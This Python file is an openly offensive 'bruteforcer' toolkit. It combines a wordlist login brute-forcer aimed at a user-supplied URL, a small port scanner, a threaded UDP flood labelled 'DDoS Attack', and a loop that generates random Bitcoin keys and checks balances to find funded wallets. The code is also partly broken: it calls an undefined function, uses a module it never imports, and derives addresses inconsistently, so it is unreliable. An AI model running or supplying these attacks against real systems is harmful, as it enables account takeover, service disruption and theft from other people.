# Merged Bruteforce Tool - Combining Features from both scripts

import os
import socket
import requests
import threading
import logging
import random
import binascii
import hashlib
import time
import csv
import ecdsa
import pyfiglet
from colorama import Fore, Style, init
from tqdm import tqdm
from validators import url

# Initialize colorama for colored output
init(autoreset=True)

# Enhanced logging configuration
logging.basicConfig(level=logging.INFO, filename="bruteforce.log", filemode="w",
                    format="%(asctime)s - %(levelname)s - %(message)s")

# Banner for visual appeal
def print_banner():
    bruteforcer_banner = pyfiglet.figlet_format("bruteforcer", font="slant")
    colors = [Fore.MAGENTA, Fore.CYAN, Fore.GREEN]
    
    for i, line in enumerate(bruteforcer_banner.splitlines()):
        print(colors[i % len(colors)] + Style.BRIGHT + line)

    break_the_internet_banner = pyfiglet.figlet_format("break the interwebs", font="digital")
    
    for i, line in enumerate(break_the_internet_banner.splitlines()):
        print(colors[i % len(colors)] + Style.BRIGHT + line)

# Web Login Brute Force (from brute2_cleaned.py)
def get_user_input():
    """Gather user input for web brute force tool."""
    print("=== Web Login Brute Force Tool ===")

    url = input("Enter target URL: ")
    while not url or not validators.url(url):
        print("Invalid or unreachable URL. Please try again.")
        url = input("Enter target URL: ")

    username = input("Enter username: ")
    password_file = input("Enter path to password list file: ")

    while not os.path.isfile(password_file):
        print("Password file not found. Please try again.")
        password_file = input("Enter path to password list file: ")

    return url, username, password_file

# Bitcoin Brute Force Tool (from brute2_cleaned.py)
def prikey():
    return binascii.hexlify(os.urandom(32)).decode('utf-8')

def pubkey(prikey):
    prikey = binascii.unhexlify(prikey)
    sign = ecdsa.SigningKey.from_string(prikey, curve=ecdsa.SECP256k1)
    return '04' + binascii.hexlify(sign.verifying_key.to_string()).decode('utf-8')

def address(pubkey):
    alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
    val = hashlib.new('ripemd160')
    val.update(hashlib.sha256(binascii.unhexlify(pubkey.encode())).digest())
    return val.hexdigest()

def balance(address):
    try:
        APIGet = requests.get(f"http://webbtc.com/address/{address}.json")
        if APIGet.status_code == 200:
            return int(APIGet.json()["balance"])
        return 0
    except Exception as e:
        logging.error(f"Error checking balance: {e}")
        return -1

def bitcoin_brute_force():
    while True:
        data = [prikey(), pubkey(prikey()), address(pubkey(prikey()))]
        bal = balance(data[2])
        if bal > 0:
            print(f"Address: {data[2]} | Balance: {bal}")
            with open("bitforce-found.txt", "a") as fl:
                fl.write(f"Address: {data[2]} | Balance: {bal}\n")

# IP/Website Scanner (from bruteforcer.py)
def ipscanner(ip_or_website):
    try:
        ip_add = socket.gethostbyname(ip_or_website)
        print(f"{Fore.GREEN}[INFO] Successfully resolved {ip_or_website} to IP address: {ip_add}")
    except socket.gaierror:
        print(f"{Fore.MAGENTA}[ERROR] Unable to resolve {ip_or_website}")
        return

    print(f"{Fore.CYAN}[INFO] Starting port scan on {ip_add}...")

    open_ports = []
    common_ports = [80, 443, 22, 21, 8080]
    for port in tqdm(common_ports, desc="Scanning Ports", ncols=75):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)
            result = s.connect_ex((ip_add, port))
            if result == 0:
                open_ports.append(port)

    if open_ports:
        print(f"{Fore.GREEN}[SUCCESS] Open ports on {ip_add}: {', '.join(map(str, open_ports))}")
    else:
        print(f"{Fore.MAGENTA}[INFO] No open ports found on {ip_add}")

# Enhanced Brute Force Attack (from bruteforcer.py)
def enhanced_brute_force_attack(target_url, username_file, password_file):
    try:
        with open(username_file, 'r') as uf, open(password_file, 'r') as pf:
            usernames = uf.read().splitlines()
            passwords = pf.read().splitlines()
    except FileNotFoundError as e:
        print(f"Error: {e}")
        return

    for username in usernames:
        for password in passwords:
            response = requests.post(target_url, data={'username': username, 'password': password})
            if 'success' in response.text.lower():
                print(f'Success: {username}:{password}')
                return
            else:
                print(f'Failed: {username}:{password}')

# DDoS Attack Simulation (from bruteforcer.py)
def ddos_attack(target_ip, port, ip_address):
    print(f"Starting DDoS attack on {target_ip}:{port} from {ip_address}...")
    
    message = b"A" * 1024
    
    def attack():
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            while True:
                s.sendto(message, (target_ip, port))

    for i in range(100):
        thread = threading.Thread(target=attack)
        thread.start()

# Unified Menu combining all features
def unified_menu():
    print_banner()
    print(f"{Fore.CYAN}[MENU] Please choose one of the following options:")
    print(f"{Fore.MAGENTA}1. Web Login Brute Force")
    print(f"{Fore.GREEN}2. Bitcoin Brute Force (Wallet Balance Check)")
    print(f"{Fore.CYAN}3. Admin Panel Snatcher")
    print(f"{Fore.MAGENTA}4. IP/Website Scanner")
    print(f"{Fore.GREEN}5. DDoS Attack")
    print(f"{Fore.CYAN}6. Exit")
    
    choice = input("Enter your choice: ")
    
    if choice == '1':
        url, username, password_file = get_user_input()
        print(f"Running brute force on {url} with username '{username}'...")

    elif choice == '2':
        bitcoin_brute_force()

    elif choice == '3':
        target_url = input(f"Enter the target URL for Admin Panel Snatcher: ")
        searchpanel(target_url)

    elif choice == '4':
        ip_or_website = input(f"Enter IP or Website to scan: ")
        ipscanner(ip_or_website)

    elif choice == '5':
        target_ip = input(f"Enter target IP: ")
        port = int(input(f"Enter port: "))
        ip_address = input(f"Enter your IP address: ")
        ddos_attack(target_ip, port, ip_address)

    elif choice == '6':
        print(f"Exiting...")
        exit(0)
    else:
        print(f"{Fore.MAGENTA}[ERROR] Invalid option!")
        unified_menu()

# Entry point
if __name__ == '__main__':
    try:
        unified_menu()
    except KeyboardInterrupt:
        print("\nProcess interrupted by user. Exiting...")
        exit()
    except Exception as e:
        logging.error(f"Critical error occurred: {e}")
        print("A critical error occurred. Please check the log for more details.")
